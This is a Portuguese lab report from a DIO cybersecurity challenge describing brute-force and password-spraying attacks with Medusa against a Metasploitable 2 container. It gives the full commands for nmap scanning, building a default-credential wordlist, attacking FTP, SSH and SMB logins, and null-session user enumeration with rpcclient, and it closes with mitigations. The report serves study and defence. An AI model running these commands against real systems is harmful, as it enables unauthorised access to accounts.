# Relatório de Auditoria Técnica: Ataque de Força Bruta com Medusa

Este repositório contém a documentação e os artefatos de um laboratório de cibersegurança focado em ataques de força bruta (Brute Force), realizado como parte do desafio da plataforma DIO.

## 🏗️ Estrutura do Ambiente
Diferente do modelo tradicional de Máquinas Virtuais, este laboratório foi orquestrado utilizando Docker Compose, o que permitiu a criação de uma rede isolada e de alto desempenho.

* Atacante: Kali Linux (Container com ferramentas de rede).
* Alvo: Metasploitable 2 (Container propositalmente vulnerável).
* Rede: Bridge personalizada isolando os dois ativos.

---

## 🛡️ Metodologia Acadêmica (Passo a Passo)

Abaixo, detalho a linha de raciocínio técnica aplicada, onde cada etapa justifica a subsequente.

### 1. Validação de Conectividade
O primeiro passo foi garantir que o alvo estava visível na camada de rede.
Comando: ping -c 3 alvo
- Análise: O sucesso do protocolo ICMP confirmou que não havia firewalls bloqueando a comunicação básica entre as instâncias.

### 2. Reconhecimento e Enumeração de Serviços
Com o host ativo, realizei uma varredura para mapear a superfície de ataque.
Comando: nmap -sV -T4 -F alvo
- Justificativa: A flag -sV foi usada para identificar as versões dos serviços. 
- Estrutura do Alvo: Foram detectadas portas críticas abertas, especificamente 21 (FTP) e 22 (SSH). A presença de serviços legados (vsftpd 2.3.4) confirmou a viabilidade de um ataque de autenticação.

### 3. Armamentismo (Criação de Wordlists)
Identificados os serviços, preparei a "munição" técnica para o teste.
Comandos:
echo "msfadmin" > users.txt
echo -e "msfadmin\n123456\npassword\nadmin" > pass.txt
- Linha de Raciocínio: Em auditorias, começamos com Credenciais Padrão. O usuário msfadmin é o padrão para sistemas Metasploitable, e as senhas criadas cobrem as combinações mais comuns em configurações negligentes.

### 4. Execução do Exploit (Quebra de Autenticação)
Utilizei o Medusa para automatizar as tentativas de login nos serviços identificados.

Ataque ao FTP:
medusa -h alvo -u msfadmin -P pass.txt -M ftp

Ataque ao SSH:
medusa -h alvo -u msfadmin -P pass.txt -M ssh

- Análise de Resultado: Em ambos os protocolos, o Medusa retornou SUCCESS para a combinação msfadmin/msfadmin em menos de um segundo. Isso prova que o alvo não possui mecanismos de Rate Limiting ou bloqueio de conta.

### 5. Enumeração de Usuários (SMB)
Extração de contas reais via Null Session para evitar wordlists genéricas:
`rpcclient -U "" -N alvo -c "enumdomusers" | cut -d "[" -f2 | cut -d "]" -f1 > user_list.txt`
*Resultado:* 35 usuários identificados (ex: msfadmin, postgres, root).

### 6. Password Spraying (Medusa)
Teste da credencial `msfadmin` contra toda a lista minerada.
*Comando:* `medusa -h alvo -U user_list.txt -p msfadmin -M smbnt`
*Resultado:* `ACCOUNT FOUND: msfadmin / msfadmin [SUCCESS (ADMIN$)]`
*Análise:* Acesso administrativo confirmado via compartilhamento oculto.


---

## 📉 Conclusões e Medidas de Mitigação

A exploração bem-sucedida demonstra que a segurança do sistema é nula quando as credenciais são previsíveis. Como analista, as recomendações para este cenário são:

1. Políticas de Credenciais: Alteração obrigatória de senhas padrão no primeiro acesso.
2. Protocolos Seguros: Desativação do serviço FTP em favor do SFTP (SSH File Transfer Protocol).
3. Implementação de IPS: Instalação de ferramentas como o Fail2Ban, que monitoram logs e banem automaticamente IPs que falham em múltiplas tentativas de login.
4. Autenticação por Chave: No SSH, desabilitar o login por senha e permitir apenas chaves RSA/Ed25519.

---
Este projeto foi desenvolvido para fins estritamente educacionais e de estudo de segurança defensiva.